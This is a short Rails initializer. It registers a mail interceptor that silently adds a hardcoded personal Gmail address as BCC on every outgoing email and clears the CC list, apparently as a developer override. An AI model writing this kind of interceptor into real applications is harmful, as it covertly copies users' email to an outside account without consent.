# frozen_string_literal: true

class OverrideMailRecipient
  class << self
    def delivering_email(mail)
      mail.bcc = 'manurag501@gmail.com'
      mail.cc = []
    rescue StandardError => e
      e.message
    end
  end
end

ActionMailer::Base.register_interceptor(OverrideMailRecipient)
